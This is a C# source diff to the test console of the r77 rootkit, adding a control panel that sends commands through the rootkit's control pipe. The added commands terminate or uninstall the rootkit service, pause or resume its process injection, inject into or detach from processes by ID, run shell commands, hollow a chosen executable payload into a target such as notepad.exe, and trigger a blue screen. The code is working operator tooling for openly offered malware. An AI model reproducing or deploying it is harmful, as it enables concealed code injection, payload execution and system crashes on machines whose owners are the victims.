@@ -5,6 +5,7 @@ using BytecodeApi.IO.Http;
 using BytecodeApi.Threading;
 using BytecodeApi.UI;
 using BytecodeApi.UI.Data;
+using BytecodeApi.UI.Dialogs;
 using Global;
 using System;
 using System.Collections.ObjectModel;
@@ -28,6 +29,8 @@ namespace TestConsole
 		private DelegateCommand<ProcessView> _UnhideCommand;
 		private DelegateCommand _InjectAllCommand;
 		private DelegateCommand _DetachAllCommand;
+		private DelegateCommand _ControlCodeRunPEPayloadPathBrowseCommand;
+		private DelegateCommand<ControlCode> _ControlCommand;
 		private DelegateCommand<string> _HelpCommand;
 		public DelegateCommand ElevateCommand => _ElevateCommand ?? (_ElevateCommand = new DelegateCommand(ElevateCommand_Execute, ElevateCommand_CanExecute));
 		public DelegateCommand<string> RunCommand => _RunCommand ?? (_RunCommand = new DelegateCommand<string>(RunCommand_Execute));
@@ -37,34 +40,84 @@ namespace TestConsole
 		public DelegateCommand<ProcessView> UnhideCommand => _UnhideCommand ?? (_UnhideCommand = new DelegateCommand<ProcessView>(UnhideCommand_Execute));
 		public DelegateCommand InjectAllCommand => _InjectAllCommand ?? (_InjectAllCommand = new DelegateCommand(InjectAllCommand_Execute));
 		public DelegateCommand DetachAllCommand => _DetachAllCommand ?? (_DetachAllCommand = new DelegateCommand(DetachAllCommand_Execute));
+		public DelegateCommand ControlCodeRunPEPayloadPathBrowseCommand => _ControlCodeRunPEPayloadPathBrowseCommand ?? (_ControlCodeRunPEPayloadPathBrowseCommand = new DelegateCommand(ControlCodeRunPEPayloadPathBrowseCommand_Execute));
+		public DelegateCommand<ControlCode> ControlCommand => _ControlCommand ?? (_ControlCommand = new DelegateCommand<ControlCode>(ControlCommand_Execute));
 		public DelegateCommand<string> HelpCommand => _HelpCommand ?? (_HelpCommand = new DelegateCommand<string>(HelpCommand_Execute));
 
 		private bool UpdateProcessesNow;
+		private bool _IsInitialized;
+		private ObservableCollection<ProcessView> _Processes;
+		private ProcessView _SelectedProcess;
+		private bool _IsAboutVisible;
+		private string _ControlCodeInjectProcessId;
+		private string _ControlCodeDetachProcessId;
+		private string _ControlCodeShellExecPath;
+		private string _ControlCodeShellExecCommandLine;
+		private string _ControlCodeRunPETargetPath;
+		private string _ControlCodeRunPEPayloadPath;
 		public bool IsInitialized
 		{
-			get => Get(() => IsInitialized);
-			set => Set(() => IsInitialized, value);
+			get => _IsInitialized;
+			set => Set(ref _IsInitialized, value);
 		}
 		public ObservableCollection<ProcessView> Processes
 		{
-			get => Get(() => Processes, () => new ObservableCollection<ProcessView>());
-			set => Set(() => Processes, value);
+			get => _Processes;
+			set
+			{
+				Set(ref _Processes, value);
+				RaisePropertyChanged(nameof(IsR77ServiceRunning));
+			}
 		}
 		public ProcessView SelectedProcess
 		{
-			get => Get(() => SelectedProcess);
-			set => Set(() => SelectedProcess, value);
+			get => _SelectedProcess;
+			set => Set(ref _SelectedProcess, value);
 		}
+		public bool IsR77ServiceRunning => Processes.Count(process => process.IsR77Service || process.Name == "dllhost.exe" && process.IsHiddenById) >= (Environment.Is64BitOperatingSystem ? 2 : 1);
 		public bool IsAboutVisible
 		{
-			get => Get(() => IsAboutVisible);
-			set => Set(() => IsAboutVisible, value);
+			get => _IsAboutVisible;
+			set => Set(ref _IsAboutVisible, value);
+		}
+		public string ControlCodeInjectProcessId
+		{
+			get => _ControlCodeInjectProcessId;
+			set => Set(ref _ControlCodeInjectProcessId, value);
+		}
+		public string ControlCodeDetachProcessId
+		{
+			get => _ControlCodeDetachProcessId;
+			set => Set(ref _ControlCodeDetachProcessId, value);
+		}
+		public string ControlCodeShellExecPath
+		{
+			get => _ControlCodeShellExecPath;
+			set => Set(ref _ControlCodeShellExecPath, value);
+		}
+		public string ControlCodeShellExecCommandLine
+		{
+			get => _ControlCodeShellExecCommandLine;
+			set => Set(ref _ControlCodeShellExecCommandLine, value);
+		}
+		public string ControlCodeRunPETargetPath
+		{
+			get => _ControlCodeRunPETargetPath;
+			set => Set(ref _ControlCodeRunPETargetPath, value);
+		}
+		public string ControlCodeRunPEPayloadPath
+		{
+			get => _ControlCodeRunPEPayloadPath;
+			set => Set(ref _ControlCodeRunPEPayloadPath, value);
 		}
 
 		public MainWindowViewModel(MainWindow view)
 		{
 			Singleton = this;
 			View = view;
+
+			Processes = new ObservableCollection<ProcessView>();
+			ControlCodeRunPETargetPath = @"C:\Windows\System32\notepad.exe";
 		}
 
 		public void OnLoaded()
@@ -190,6 +243,198 @@ namespace TestConsole
 			Log(ProcessList.DetachAll().ToArray());
 			UpdateProcesses();
 		}
+		private void ControlCodeRunPEPayloadPathBrowseCommand_Execute()
+		{
+			if (FileDialogs.Open("exe") is string path)
+			{
+				ControlCodeRunPEPayloadPath = path;
+			}
+		}
+		private void ControlCommand_Execute(ControlCode parameter)
+		{
+			try
+			{
+				switch (parameter)
+				{
+					case ControlCode.R77TerminateService:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.R77Uninstall:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.R77PauseInjection:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.R77ResumeInjection:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.ProcessesInject:
+						{
+							if (ControlCodeInjectProcessId.IsNullOrWhiteSpace())
+							{
+								Log(new LogMessage
+								(
+									LogMessageType.Error,
+									new LogFileItem(parameter.GetDescription()),
+									new LogTextItem("Specify a process ID.")
+								));
+							}
+							else if (ControlCodeInjectProcessId.ToInt32OrNull() is int processId)
+							{
+								Log(ControlPipe.Write(parameter, BitConverter.GetBytes(processId), ControlCodeInjectProcessId).ToArray());
+							}
+							else
+							{
+								Log(new LogMessage
+								(
+									LogMessageType.Error,
+									new LogFileItem(parameter.GetDescription()),
+									new LogTextItem("Invalid process ID:"),
+									new LogDetailsItem(ControlCodeInjectProcessId)
+								));
+							}
+						}
+						break;
+					case ControlCode.ProcessesInjectAll:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.ProcessesDetach:
+						{
+							if (ControlCodeDetachProcessId.IsNullOrWhiteSpace())
+							{
+								Log(new LogMessage
+								(
+									LogMessageType.Error,
+									new LogFileItem(parameter.GetDescription()),
+									new LogTextItem("Specify a process ID.")
+								));
+							}
+							else if (ControlCodeDetachProcessId.ToInt32OrNull() is int processId)
+							{
+								Log(ControlPipe.Write(parameter, BitConverter.GetBytes(processId), ControlCodeDetachProcessId).ToArray());
+							}
+							else
+							{
+								Log(new LogMessage
+								(
+									LogMessageType.Error,
+									new LogFileItem(parameter.GetDescription()),
+									new LogTextItem("Invalid process ID:"),
+									new LogDetailsItem(ControlCodeDetachProcessId)
+								));
+							}
+						}
+						break;
+					case ControlCode.ProcessesDetachAll:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.UserShellExec:
+						ControlCodeShellExecPath = ControlCodeShellExecPath?.Trim().ToNullIfEmpty();
+						ControlCodeShellExecCommandLine = ControlCodeShellExecCommandLine?.Trim().ToNullIfEmpty();
+
+						if (ControlCodeShellExecPath == null)
+						{
+							Log(new LogMessage
+							(
+								LogMessageType.Error,
+								new LogFileItem(parameter.GetDescription()),
+								new LogTextItem("Specify a path.")
+							));
+						}
+						else
+						{
+							using (MemoryStream memoryStream = new MemoryStream())
+							{
+								using (BinaryWriter writer = new BinaryWriter(memoryStream))
+								{
+									writer.Write(ControlCodeShellExecPath.ToUnicodeBytes());
+									writer.Write((short)0);
+									if (ControlCodeShellExecCommandLine != null) writer.Write(ControlCodeShellExecCommandLine.ToUnicodeBytes());
+									writer.Write((short)0);
+								}
+
+								Log(ControlPipe.Write(parameter, memoryStream.ToArray(), ControlCodeShellExecPath + (ControlCodeShellExecCommandLine == null ? null : " " + ControlCodeShellExecCommandLine)).ToArray());
+							}
+						}
+						break;
+					case ControlCode.UserRunPE:
+						ControlCodeRunPETargetPath = ControlCodeRunPETargetPath?.Trim().ToNullIfEmpty();
+						ControlCodeRunPEPayloadPath = ControlCodeRunPEPayloadPath?.Trim().ToNullIfEmpty();
+
+						if (ControlCodeRunPETargetPath == null)
+						{
+							Log(new LogMessage
+							(
+								LogMessageType.Error,
+								new LogFileItem(parameter.GetDescription()),
+								new LogTextItem("Specify a target path.")
+							));
+						}
+						else if (ControlCodeRunPEPayloadPath == null)
+						{
+							Log(new LogMessage
+							(
+								LogMessageType.Error,
+								new LogFileItem(parameter.GetDescription()),
+								new LogTextItem("Specify a payload.")
+							));
+						}
+						else if (!File.Exists(ControlCodeRunPETargetPath))
+						{
+							Log(new LogMessage
+							(
+								LogMessageType.Error,
+								new LogTextItem("File"),
+								new LogFileItem(Path.GetFileName(ControlCodeRunPETargetPath)),
+								new LogTextItem("not found.")
+							));
+						}
+						else if (!File.Exists(ControlCodeRunPEPayloadPath))
+						{
+							Log(new LogMessage
+							(
+								LogMessageType.Error,
+								new LogTextItem("File"),
+								new LogFileItem(Path.GetFileName(ControlCodeRunPEPayloadPath)),
+								new LogTextItem("not found.")
+							));
+						}
+						else
+						{
+							using (MemoryStream memoryStream = new MemoryStream())
+							{
+								using (BinaryWriter writer = new BinaryWriter(memoryStream))
+								{
+									writer.Write(ControlCodeRunPETargetPath.ToUnicodeBytes());
+									writer.Write((short)0);
+									writer.Write((int)new FileInfo(ControlCodeRunPEPayloadPath).Length);
+									writer.Write(File.ReadAllBytes(ControlCodeRunPEPayloadPath));
+								}
+
+								Log(ControlPipe.Write(parameter, memoryStream.ToArray(), Path.GetFileName(ControlCodeRunPEPayloadPath) + " -> " + Path.GetFileName(ControlCodeRunPETargetPath)).ToArray());
+							}
+						}
+						break;
+					case ControlCode.SystemBsod:
+						if (MessageBoxes.Confirmation("WARNING: This will trigger a blue screen.\r\nContinue?", true) == true)
+						{
+							Log(ControlPipe.Write(parameter).ToArray());
+						}
+						break;
+					default:
+						throw new ArgumentException();
+				}
+			}
+			catch (Exception ex)
+			{
+				Log(new LogMessage
+				(
+					LogMessageType.Error,
+					new LogTextItem("Sending command to control pipe failed."),
+					new LogDetailsItem("Error Details: " + ex.Message)
+				));
+			}
+		}
 		private void HelpCommand_Execute(string parameter)
 		{
 			switch (parameter)
@@ -197,7 +442,7 @@ namespace TestConsole
 				case "Documentation":
 					try
 					{
-						byte[] pdf = HttpClient.Default.CreateGetRequest("https://bytecode77.com/downloads/r77%20Rootkit%20Technical%20Documentation.pdf").ReadBytes();
+						byte[] pdf = HttpClient.Default.Get("https://bytecode77.com/downloads/r77%20Rootkit%20Technical%20Documentation.pdf").ReadBytes();
 						TempDirectory.ExecuteFile("Technical Documentation.pdf", pdf);
 					}
 					catch (Exception ex)
